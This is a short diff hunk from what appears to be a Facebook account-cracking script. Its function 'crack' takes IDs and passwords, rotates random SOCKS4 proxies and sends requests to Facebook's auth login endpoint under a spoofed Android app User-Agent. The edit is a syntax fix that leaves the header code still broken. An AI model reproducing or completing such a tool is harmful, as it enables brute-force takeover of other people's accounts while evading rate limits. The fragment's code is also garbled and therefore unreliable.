@@ -476,7 +476,7 @@ def crack(idf,pwv):
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update= 'https://api.facebook.com/auth/login
+			ses.headers.update('https://api.facebook.com/auth/login')
 'User-Agent', '[FBAN/FB4A;FBAV/23.0.0.4018;FBBV/6001328;[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429651007;FBDM/{density=3.0,width=1080,height=2130};FBLC/en_US;FBRV/433511452;FBCR/MY MAXIS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PAR-LX9;FBSV/8.8.8;FBOP/9;FBCA/armeabi-v7a:armeabi;]'
 'Accept-Encoding', 'gzip, deflate'
 'Accept', '*/*'
